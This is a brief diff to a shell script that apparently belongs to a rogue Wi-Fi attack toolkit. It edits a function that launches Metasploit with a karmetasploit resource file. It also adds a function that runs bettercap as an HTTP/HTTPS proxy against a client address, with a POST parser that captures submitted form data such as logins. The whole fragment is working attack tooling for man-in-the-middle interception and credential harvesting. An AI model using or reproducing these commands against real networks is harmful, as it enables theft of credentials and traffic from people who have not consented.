@@ -126,7 +126,11 @@ start_netcreds(){
 
 start_msfconsole(){
         sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
-        msfconsole -r $etc/karmetasploit.rc&
+        msfconsole -r $etc/karmetasploit.rc& #Remove "&" to fix msfconsole exiting
+}
+
+start_bettercap(){
+ bettercap -T 10.0.0.20 --interface $phy --no-spoofing --no-discovery --proxy --proxy-port 80 --proxy-https-port 443 -P POST
 }
 
 hangon(){
